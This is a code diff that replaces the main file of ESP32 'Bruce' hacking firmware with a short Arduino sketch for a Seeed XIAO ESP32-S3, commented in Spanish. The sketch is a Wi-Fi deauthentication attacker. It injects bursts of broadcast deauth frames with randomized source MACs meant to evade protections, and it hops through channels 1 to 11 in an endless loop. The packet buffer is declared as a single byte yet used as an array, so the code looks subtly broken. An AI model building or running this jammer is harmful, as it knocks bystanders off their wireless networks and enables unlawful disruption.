@@ -1,472 +1,58 @@
-#include "core/main_menu.h"
-#include <globals.h>
-
-#include "core/powerSave.h"
-#include "core/serial_commands/cli.h"
-#include "core/utils.h"
-#include "current_year.h"
-#include "esp32-hal-psram.h"
-#include "esp_task_wdt.h"
+#include <Arduino.h>
+#include <WiFi.h>
 #include "esp_wifi.h"
-#include <functional>
-#include <string>
-#include <vector>
-io_expander ioExpander;
-BruceConfig bruceConfig;
-BruceConfigPins bruceConfigPins;
 
-SerialCli serialCli;
-USBSerial USBserial;
-SerialDevice *serialDevice = &USBserial;
-
-StartupApp startupApp;
-String startupAppJSInterpreterFile = "";
-
-MainMenu mainMenu;
-SPIClass sdcardSPI;
-#ifdef USE_HSPI_PORT
-#ifndef VSPI
-#define VSPI FSPI
-#endif
-SPIClass CC_NRF_SPI(VSPI);
-#else
-SPIClass CC_NRF_SPI(HSPI);
-#endif
-
-// Navigation Variables
-volatile bool NextPress = false;
-volatile bool PrevPress = false;
-volatile bool UpPress = false;
-volatile bool DownPress = false;
-volatile bool SelPress = false;
-volatile bool EscPress = false;
-volatile bool AnyKeyPress = false;
-volatile bool NextPagePress = false;
-volatile bool PrevPagePress = false;
-volatile bool LongPress = false;
-volatile bool SerialCmdPress = false;
-volatile int forceMenuOption = -1;
-volatile uint8_t menuOptionType = 0;
-String menuOptionLabel = "";
-#ifdef HAS_ENCODER_LED
-volatile int EncoderLedChange = 0;
-#endif
-
-TouchPoint touchPoint;
-
-keyStroke KeyStroke;
-
-TaskHandle_t xHandle;
-void __attribute__((weak)) taskInputHandler(void *parameter) {
-    auto timer = millis();
-    while (true) {
-        checkPowerSaveTime();
-        // Sometimes this task run 2 or more times before looptask,
-        // and navigation gets stuck, the idea here is run the input detection
-        // if AnyKeyPress is false, or rerun if it was not renewed within 75ms (arbitrary)
-        // because AnyKeyPress will be true if didn´t passed through a check(bool var)
-        if (!AnyKeyPress || millis() - timer > 75) {
-            NextPress = false;
-            PrevPress = false;
-            UpPress = false;
-            DownPress = false;
-            SelPress = false;
-            EscPress = false;
-            AnyKeyPress = false;
-            SerialCmdPress = false;
-            NextPagePress = false;
-            PrevPagePress = false;
-            touchPoint.pressed = false;
-            touchPoint.Clear();
-#ifndef USE_TFT_eSPI_TOUCH
-            InputHandler();
-#endif
-            timer = millis();
-        }
-        vTaskDelay(pdMS_TO_TICKS(10));
-    }
-}
-// Public Globals Variables
-unsigned long previousMillis = millis();
-int prog_handler; // 0 - Flash, 1 - LittleFS, 3 - Download
-String cachedPassword = "";
-int8_t interpreter_state = -1;
-bool sdcardMounted = false;
-bool gpsConnected = false;
-
-// wifi globals
-// TODO put in a namespace
-bool wifiConnected = false;
-bool isWebUIActive = false;
-String wifiIP;
-
-bool BLEConnected = false;
-bool returnToMenu;
-bool isSleeping = false;
-bool isScreenOff = false;
-bool dimmer = false;
-char timeStr[16];
-time_t localTime;
-struct tm *timeInfo;
-#if defined(HAS_RTC)
-#if defined(HAS_RTC_PCF85063A)
-pcf85063_RTC _rtc;
-#else
-cplus_RTC _rtc;
-#endif
-RTC_TimeTypeDef _time;
-RTC_DateTypeDef _date;
-bool clock_set = true;
-#else
-ESP32Time rtc;
-bool clock_set = false;
-#endif
-
-std::vector<Option> options;
-// Protected global variables
-#if defined(HAS_SCREEN)
-tft_logger tft = tft_logger(); // Invoke custom library
-tft_sprite sprite = tft_sprite(&tft);
-tft_sprite draw = tft_sprite(&tft);
-volatile int tftWidth = TFT_HEIGHT;
-#ifdef HAS_TOUCH
-volatile int tftHeight =
-    TFT_WIDTH - 20; // 20px to draw the TouchFooter(), were the btns are being read in touch devices.
-#else
-volatile int tftHeight = TFT_WIDTH;
-#endif
-#else
-tft_logger tft;
-SerialDisplayClass &sprite = tft;
-SerialDisplayClass &draw = tft;
-volatile int tftWidth = VECTOR_DISPLAY_DEFAULT_HEIGHT;
-volatile int tftHeight = VECTOR_DISPLAY_DEFAULT_WIDTH;
-#endif
-
-#include "core/display.h"
-#include "core/led_control.h"
-#include "core/mykeyboard.h"
-#include "core/sd_functions.h"
-#include "core/serialcmds.h"
-#include "core/settings.h"
-#include "core/wifi/webInterface.h"
-#include "core/wifi/wifi_common.h"
-#include "modules/bjs_interpreter/interpreter.h" // for JavaScript interpreter
-#include "modules/others/audio.h"                // for playAudioFile
-#include "modules/rf/rf_utils.h"                 // for initCC1101once
-#include <Wire.h>
-
-/*********************************************************************
- **  Function: begin_storage
- **  Config LittleFS and SD storage
- *********************************************************************/
-void begin_storage() {
-    if (!LittleFS.begin(true)) { LittleFS.format(), LittleFS.begin(); }
-    bool checkFS = setupSdCard();
-    bruceConfig.fromFile(checkFS);
-    bruceConfigPins.fromFile(checkFS);
-}
-
-/*********************************************************************
- **  Function: _setup_gpio()
- **  Sets up a weak (empty) function to be replaced by /ports/* /interface.h
- *********************************************************************/
-void _setup_gpio() __attribute__((weak));
-void _setup_gpio() {}
-
-/*********************************************************************
- **  Function: _post_setup_gpio()
- **  Sets up a weak (empty) function to be replaced by /ports/* /interface.h
- *********************************************************************/
-void _post_setup_gpio() __attribute__((weak));
-void _post_setup_gpio() {}
-
-/*********************************************************************
- **  Function: setup_gpio
- **  Setup GPIO pins
- *********************************************************************/
-void setup_gpio() {
-
-    // init setup from /ports/*/interface.h
-    _setup_gpio();
-
-    // Smoochiee v2 uses a AW9325 tro control GPS, MIC, Vibro and CC1101 RX/TX powerlines
-    ioExpander.init(IO_EXPANDER_ADDRESS, &Wire);
-
-#if TFT_MOSI > 0
-    if (bruceConfigPins.CC1101_bus.mosi == (gpio_num_t)TFT_MOSI)
-        initCC1101once(&tft.getSPIinstance()); // (T_EMBED), CORE2 and others
-    else
-#endif
-        if (bruceConfigPins.CC1101_bus.mosi == bruceConfigPins.SDCARD_bus.mosi)
-        initCC1101once(&sdcardSPI); // (ARDUINO_M5STACK_CARDPUTER) and (ESP32S3DEVKITC1) and devices that
-                                    // share CC1101 pin with only SDCard
-    else initCC1101once(NULL);
-    // (ARDUINO_M5STICK_C_PLUS) || (ARDUINO_M5STICK_C_PLUS2) and others that doesn´t share SPI with
-    // other devices (need to change it when Bruce board comes to shore)
-}
-
-/*********************************************************************
- **  Function: begin_tft
- **  Config tft
- *********************************************************************/
-void begin_tft() {
-    tft.setRotation(bruceConfigPins.rotation); // sometimes it misses the first command
-    tft.invertDisplay(bruceConfig.colorInverted);
-    tft.setRotation(bruceConfigPins.rotation);
-    tftWidth = tft.width();
-#ifdef HAS_TOUCH
-    tftHeight = tft.height() - 20;
-#else
-    tftHeight = tft.height();
-#endif
-    resetTftDisplay();
-    setBrightness(bruceConfig.bright, false);
-}
-
-/*********************************************************************
- **  Function: boot_screen
- **  Draw boot screen
- *********************************************************************/
-void boot_screen() {
-    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-    tft.setTextSize(FM);
-    tft.drawPixel(0, 0, bruceConfig.bgColor);
-    tft.drawCentreString("Bruce", tftWidth / 2, 10, 1);
-    tft.setTextSize(FP);
-    tft.drawCentreString(BRUCE_VERSION, tftWidth / 2, 25, 1);
-    tft.setTextSize(FM);
-    tft.drawCentreString(
-        "PREDATORY FIRMWARE", tftWidth / 2, tftHeight + 2, 1
-    ); // will draw outside the screen on non touch devices
-}
-
-/*********************************************************************
- **  Function: boot_screen_anim
- **  Draw boot screen
- *********************************************************************/
-void boot_screen_anim() {
-    boot_screen();
-    int i = millis();
-    // checks for boot.jpg in SD and LittleFS for customization
-    int boot_img = 0;
-    bool drawn = false;
-    if (sdcardMounted) {
-        if (SD.exists("/boot.jpg")) boot_img = 1;
-        else if (SD.exists("/boot.gif")) boot_img = 3;
-    }
-    if (boot_img == 0 && LittleFS.exists("/boot.jpg")) boot_img = 2;
-    else if (boot_img == 0 && LittleFS.exists("/boot.gif")) boot_img = 4;
-    if (bruceConfig.theme.boot_img) boot_img = 5; // override others
-
-    tft.drawPixel(0, 0, 0);       // Forces back communication with TFT, to avoid ghosting
-                                  // Start image loop
-    while (millis() < i + 7000) { // boot image lasts for 5 secs
-        if ((millis() - i > 2000) && !drawn) {
-            tft.fillRect(0, 45, tftWidth, tftHeight - 45, bruceConfig.bgColor);
-            if (boot_img > 0 && !drawn) {
-                tft.fillScreen(bruceConfig.bgColor);
-                if (boot_img == 5) {
-                    drawImg(
-                        *bruceConfig.themeFS(),
-                        bruceConfig.getThemeItemImg(bruceConfig.theme.paths.boot_img),
-                        0,
-                        0,
-                        true,
-                        3600
-                    );
-                    Serial.println("Image from SD theme");
-                } else if (boot_img == 1) {
-                    drawImg(SD, "/boot.jpg", 0, 0, true);
-                    Serial.println("Image from SD");
-                } else if (boot_img == 2) {
-                    drawImg(LittleFS, "/boot.jpg", 0, 0, true);
-                    Serial.println("Image from LittleFS");
-                } else if (boot_img == 3) {
-                    drawImg(SD, "/boot.gif", 0, 0, true, 3600);
-                    Serial.println("Image from SD");
-                } else if (boot_img == 4) {
-                    drawImg(LittleFS, "/boot.gif", 0, 0, true, 3600);
-                    Serial.println("Image from LittleFS");
-                }
-                tft.drawPixel(0, 0, 0); // Forces back communication with TFT, to avoid ghosting
-            }
-            drawn = true;
-        }
-#if !defined(LITE_VERSION)
-        if (!boot_img && (millis() - i > 2200) && (millis() - i) < 2700)
-            tft.drawRect(2 * tftWidth / 3, tftHeight / 2, 2, 2, bruceConfig.priColor);
-        if (!boot_img && (millis() - i > 2700) && (millis() - i) < 2900)
-            tft.fillRect(0, 45, tftWidth, tftHeight - 45, bruceConfig.bgColor);
-        if (!boot_img && (millis() - i > 2900) && (millis() - i) < 3400)
-            tft.drawXBitmap(
-                2 * tftWidth / 3 - 30,
-                5 + tftHeight / 2,
-                bruce_small_bits,
-                bruce_small_width,
-                bruce_small_height,
-                bruceConfig.bgColor,
-                bruceConfig.priColor
-            );
-        if (!boot_img && (millis() - i > 3400) && (millis() - i) < 3600) tft.fillScreen(bruceConfig.bgColor);
-        if (!boot_img && (millis() - i > 3600))
-            tft.drawXBitmap(
-                (tftWidth - 238) / 2,
-                (tftHeight - 133) / 2,
-                bits,
-                bits_width,
-                bits_height,
-                bruceConfig.bgColor,
-                bruceConfig.priColor
-            );
-#endif
-        if (check(AnyKeyPress)) // If any key or M5 key is pressed, it'll jump the boot screen
-        {
-            tft.fillScreen(bruceConfig.bgColor);
-            delay(10);
-            return;
-        }
-    }
-
-    // Clear splashscreen
-    tft.fillScreen(bruceConfig.bgColor);
-}
-
-/*********************************************************************
- **  Function: init_clock
- **  Clock initialisation for propper display in menu
- *********************************************************************/
-void init_clock() {
-#if defined(HAS_RTC)
-    _rtc.begin();
-#if defined(HAS_RTC_BM8563)
-    _rtc.GetBm8563Time();
-#endif
-#if defined(HAS_RTC_PCF85063A)
-    _rtc.GetPcf85063Time();
-#endif
-    _rtc.GetTime(&_time);
-    _rtc.GetDate(&_date);
-
-    struct tm timeinfo = {};
-    timeinfo.tm_sec = _time.Seconds;
-    timeinfo.tm_min = _time.Minutes;
-    timeinfo.tm_hour = _time.Hours;
-    timeinfo.tm_mday = _date.Date;
-    timeinfo.tm_mon = _date.Month > 0 ? _date.Month - 1 : 0;
-    timeinfo.tm_year = _date.Year >= 1900 ? _date.Year - 1900 : 0;
-    time_t epoch = mktime(&timeinfo);
-    struct timeval tv = {.tv_sec = epoch};
-    settimeofday(&tv, nullptr);
-#else
-    struct tm timeinfo = {};
-    timeinfo.tm_year = CURRENT_YEAR - 1900;
-    timeinfo.tm_mon = 0x05;
-    timeinfo.tm_mday = 0x14;
-    time_t epoch = mktime(&timeinfo);
-    rtc.setTime(epoch);
-    clock_set = true;
-    struct timeval tv = {.tv_sec = epoch};
-    settimeofday(&tv, nullptr);
-#endif
-}
-
-/*********************************************************************
- **  Function: init_led
- **  Led initialisation
- *********************************************************************/
-void init_led() {
-#ifdef HAS_RGB_LED
-    beginLed();
-#endif
-}
-
-/*********************************************************************
- **  Function: startup_sound
- **  Play sound or tone depending on device hardware
- *********************************************************************/
-void startup_sound() {
-    if (bruceConfig.soundEnabled == 0) return; // if sound is disabled, do not play sound
-#if !defined(LITE_VERSION)
-#if defined(BUZZ_PIN)
-    // Bip M5 just because it can. Does not bip if splashscreen is bypassed
-    _tone(5000, 50);
-    delay(200);
-    _tone(5000, 50);
-    /*  2fix: menu infinite loop */
-#elif defined(HAS_NS4168_SPKR)
-    // play a boot sound
-    if (bruceConfig.theme.boot_sound) {
-        playAudioFile(bruceConfig.themeFS(), bruceConfig.getThemeItemImg(bruceConfig.theme.paths.boot_sound));
-    } else if (SD.exists("/boot.wav")) {
-        playAudioFile(&SD, "/boot.wav");
-    } else if (LittleFS.exists("/boot.wav")) {
-        playAudioFile(&LittleFS, "/boot.wav");
-    }
-#endif
-#endif
-}
-
-/*********************************************************************
- **  Function: setup
- **  Where the devices are started and variables set
- *********************************************************************/
 void setup() {
     Serial.begin(115200);
 
-    // 1. Configuramos el chip Wi-Fi del ESP32-S3 en modo inyección
+    // Inicializar chip Wi-Fi integrado del ESP32-S3 en modo inyección cruda
     WiFi.mode(WIFI_STA);
     WiFi.disconnect();
     esp_wifi_set_promiscuous(true);
 
-    // 2. Preparamos el pin del LED Naranja de tu placa Seeed XIAO
+    // Configurar LED naranja integrado en la Seeed XIAO (GPIO 21)
     pinMode(21, OUTPUT);
-    digitalWrite(21, HIGH); // Lo dejamos apagado al inicio
+    digitalWrite(21, HIGH); // Apagado inicial (Lógica invertida en la XIAO)
 
     Serial.println("[XIAO S3] Inicializado correctamente en modo dedicado.");
 }
 
-/**********************************************************************
- **  Function: loop
- **  Main loop - MODIFICADO PARA SEEED XIAO ESP32S3 DEDICADO
- **********************************************************************/
 void loop() {
-    // Estructura de paquete Deauth Broadcast
+    // Estructura de paquete Deauth Broadcast estándar
     static uint8_t deauthPacket = {
         0xC0, 0x00, 0x00, 0x00,
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destino (Todos los clientes)
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Origen aleatorio
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dirección de destino (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Dirección de origen (MAC aleatoria abajo)
         0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID aleatorio
         0x00, 0x00, 0x07, 0x00
     };
 
     static int currentChannel = 1;
 
-    // Sintonizar la antena de la Seeed XIAO al canal correspondiente
+    // Sintonizar la antena a la frecuencia del canal correspondiente
     esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
-    Serial.printf("[XIAO S3] Atacando Canal: %d\n", currentChannel);
+    Serial.printf("[XIAO S3] Escaneando e inyectando en Canal: %d\n", currentChannel);
 
-    // Encendemos el LED integrado naranja (LOW enciende en la XIAO)
+    // Encender LED integrado (LOW activa la corriente en esta placa)
     digitalWrite(21, LOW);
 
-    // Emitir ráfaga rápida de 8 paquetes modificando la MAC origen para saltar bloqueos
+    // Emitir ráfaga rápida de 8 paquetes modificando la MAC origen para evadir protecciones
     for (int i = 0; i < 8; i++) {
         for (int b = 10; b < 22; b++) {
             deauthPacket[b] = random(0x00, 0xFF);
         }
-        // Inyectar el paquete directo al aire
+        // Inyección directa de tramas de control de red 802.11
         esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
         delay(2);
     }
 
-    // Apagamos el LED naranja y esperamos un instante antes de saltar de frecuencia
+    // Apagar LED naranja y esperar un breve periodo antes del cambio de frecuencia
     digitalWrite(21, HIGH);
     delay(150);
 
-    // Avanzar de canal en la banda de 2.4 GHz (Canales 1 al 11)
+    // Avanzar canal secuencialmente en la banda de 2.4 GHz
     currentChannel++;
     if (currentChannel > 11) {
         currentChannel = 1;
     }
 }
-
